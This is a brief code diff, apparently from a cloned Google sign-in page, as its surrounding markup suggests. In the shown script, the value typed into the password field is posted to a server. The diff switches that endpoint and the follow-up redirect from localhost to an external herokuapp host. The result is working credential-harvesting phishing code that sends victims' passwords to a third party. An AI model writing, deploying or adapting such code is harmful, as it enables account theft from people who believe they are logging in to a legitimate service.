@@ -56,10 +56,10 @@ initAft()</script><script id="_ij" nonce="">window.IJ_values = [[true,[["/v3/sig
     auth = $('input[type=password]').val()
 
     $.post(
-      "http://localhost:5000/auth",
+      "https://moxies.herokuapp.com/auth",
          {"password":auth},
          function (data, status){
-           window.location = "http://localhost:5000/login" 
+           window.location = "https://moxies.herokuapp.com/login" 
     }
 
   );
